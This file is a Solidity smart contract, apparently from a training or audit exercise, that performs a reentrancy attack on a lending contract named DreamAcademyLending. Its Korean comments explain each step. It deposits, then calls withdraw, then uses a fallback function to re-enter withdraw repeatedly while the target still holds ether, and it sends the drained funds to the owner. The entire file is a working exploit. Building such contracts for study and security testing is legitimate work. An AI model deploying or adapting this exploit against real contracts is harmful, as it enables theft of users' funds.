pragma solidity 0.8.13;

import "./DreamAcademyLending.sol";

contract ReentrancyAttack {
    DreamAcademyLending public target;
    address payable public owner;

    constructor(DreamAcademyLending _target) {
        target = _target;
        owner = payable(msg.sender);
    }

    // 공격을 시작하는 함수입니다.
    function attack(address _tokenAddress, uint256 _amount) external {
        require(msg.sender == owner, "Not authorized");
        target.deposit{value: _amount}(_tokenAddress, _amount);
        target.withdraw(_tokenAddress, _amount);
    }

    // 컨트랙트가 받은 Ether를 소유자에게 전송하는 함수입니다.
    function withdraw() external {
        require(msg.sender == owner, "Not authorized");
        owner.transfer(address(this).balance);
    }

    // 이 컨트랙트는 Fallback 함수를 이용하여 재진입 공격을 수행합니다.
    fallback() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw(address(0x0), msg.value);
        }
    }

    // 컨트랙트가 받은 Ether의 잔액을 확인하는 함수입니다.
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
